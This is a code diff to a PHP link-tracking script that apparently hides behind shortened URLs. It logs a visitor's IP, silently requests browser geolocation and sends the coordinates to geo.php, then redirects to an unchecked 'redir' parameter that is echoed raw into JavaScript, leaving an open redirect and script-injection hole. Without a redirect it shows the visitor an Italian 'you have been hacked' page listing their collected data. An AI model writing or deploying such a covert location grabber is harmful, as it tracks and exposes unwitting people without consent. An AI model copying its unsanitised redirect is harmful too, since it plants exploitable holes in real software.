@@ -25,7 +25,7 @@ require('config.php');
 require('ipapi.php');
 require('tinyurlapi.php');
 
-if ($_GET['redir'] && empty($_GET['geox']) ) header('Location: '.$_GET['redir']);
+if (isset($_GET['redir']) && empty($_GET['geox']) ) header('Location: '.$_GET['redir']);
 
 $ip = $_SERVER['REMOTE_ADDR'];
 $lid = $_GET['id'];
@@ -68,23 +68,83 @@ if ($res !== null){
 }
 
 if ( $_GET['geox'] == 'true') {
-	echo '<html>
-    <head>
-    	<script>
-          (function getLocation() {
-              if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position){
-                  var lat = position.coords.latitude;
-                  var lon = position.coords.longitude;
-				  window.location="geo.php?lat="+lat+"&lon="+lon+"&mid='.$first_message['result']['message_id'].'"+"&redir='.$_GET['redir'].'";                
-               });
-              }
-          })();
-        </script>
-    </head>
-    <body>
-    </body>
-    <html>';
+	if (isset($_GET['redir']) ){
+      echo '<html>
+          <head>
+              <script>
+                (function getLocation() {
+                    if (navigator.geolocation) {
+                      navigator.geolocation.getCurrentPosition(function(position){
+                        var lat = position.coords.latitude;
+                        var lon = position.coords.longitude;
+                        window.location="geo.php?lat="+lat+"&lon="+lon+"&mid='.$first_message['result']['message_id'].'"+"&redir='.$_GET['redir'].'";                
+                      }, function(err){
+                          window.location="'.$_GET['redir'].'";
+                      });
+                    } else {
+                      window.location="'.$_GET['redir'].'";
+                    }
+                })();
+              </script>
+          </head>
+          <body>
+          </body>
+          <html>';
+    } else {
+		echo '<html>
+          <head>
+              <script>
+                (function getLocation() {
+                    if (navigator.geolocation) {
+                      navigator.geolocation.getCurrentPosition(function(position){
+                        var lat = position.coords.latitude;
+                        var lon = position.coords.longitude;
+                        window.location="geo.php?lat="+lat+"&lon="+lon+"&mid='.$first_message['result']['message_id'].'";                
+                      }, function(err){
+                        document.body.innerHTML = `
+                        <div align="center" style="background-color:black">
+                        <font color="lightgreen" size="6">
+                        <h1>SEI STATO HACKERATO: </h1>
+                        <hr width="50%" />
+                        <h2>ecco i tuoi dati: </h2>
+                        '.nl2br($message).'
+                        <hr width="50%"/>
+                        <h3>Inviaci un commento</h3>
+                        <form action="comment.php" method="get"> 
+                            Nome: <input type="text" name="nome" /><br />
+                            Commento: <textarea name="commento"></textarea><br />
+                            <input type="submit" name="invia" value="invia" /><br />
+                        </form>
+                        </font>
+                        </div>
+                                `;
+                      })
+                    }else {
+                        document.body.innerHTML = `
+                        <div align="center" style="background-color:black">
+                        <font color="lightgreen" size="6">
+                        <h1>SEI STATO HACKERATO: </h1>
+                        <hr width="50%" />
+                        <h2>ecco i tuoi dati: </h2>
+                        '.nl2br($message).'
+                        <hr width="50%"/>
+                        <h3>Inviaci un commento</h3>
+                        <form action="comment.php" method="get"> 
+                            Nome: <input type="text" name="nome" /><br />
+                            Commento: <textarea name="commento"></textarea><br />
+                            <input type="submit" name="invia" value="invia" /><br />
+                        </form>
+                        </font>
+                        </div>
+                               `;
+                    }
+                })();
+                </script>
+            </head>
+            <body>
+            </body>
+            <html>';
+    }
 } else {
 	echo '<html>
   <head>
